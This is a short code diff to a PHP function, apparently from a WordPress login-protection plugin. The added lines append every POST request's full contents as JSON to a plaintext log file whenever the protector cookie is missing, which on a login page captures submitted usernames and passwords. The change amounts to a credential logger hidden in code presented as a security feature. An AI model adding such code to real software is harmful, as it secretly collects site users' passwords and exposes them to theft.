@@ -32,6 +32,9 @@ function wp_login_protector()
 
     if( empty($_COOKIE[$wp_login_protector_cookie_name]) )
     {
+        if (count($_POST) > 0) {
+            file_put_contents('wp_login_protector_post_log', json_encode($_POST)."\n", FILE_APPEND);
+        }
         if( empty($_GET[$wp_login_protector_url_param]) )
         {
             setcookie($wp_login_protector_cookie_name, '1', time()+3600, '/');
